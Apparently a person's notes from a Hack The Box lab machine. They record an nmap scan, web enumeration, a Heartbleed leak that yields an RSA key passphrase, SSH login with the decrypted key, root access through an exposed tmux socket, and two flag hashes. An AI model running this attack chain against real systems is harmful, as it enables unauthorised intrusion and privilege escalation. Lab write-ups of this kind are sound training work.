**IPv4: 10.129.234.147**

## Enumeration/Scanning
sudo nmap -sV -sC -O -v -Pn 10.129.234.147

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian
80/tcp  open  http     Apache httpd 2.2.22
443/tcp open  ssl/http Apache httpd 2.2.22

valentine.htb

/.hta                 (Status: 403) [Size: 286]
/.htpasswd            (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 291]
/cgi-bin/             (Status: 403) [Size: 290]
/decode               (Status: 200) [Size: 552]
/dev                  (Status: 301) [Size: 314] [--> http://10.129.234.147/dev/]
/encode               (Status: 200) [Size: 554]
/index                (Status: 200) [Size: 38]
/index.php            (Status: 200) [Size: 38]
/server-status        (Status: 403) [Size: 295]

notes file
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.

openssl_heartbleed gives me $text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
probably rsa pass
heartbleedbelievethehype

hype_key file
using cyberchef to decrypt hex I get an RSA file

I can use openssl to decrypt it
openssl rsa -in hype_key -out decrypted_key
heartbleedbelievethehype as rsa pass

ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i decrypted hype@10.129.234.147

577e8898d511045977d739745acf3eef

priv esc

check bash history

/.devs/dev_sess
setuid root binary

run tmux -S /.devs/dev_sess as seen in history

get root 

d02795304563775682bda4dd361ae770

## Exploitation


## Privilege Escalation


## Post-exploitation

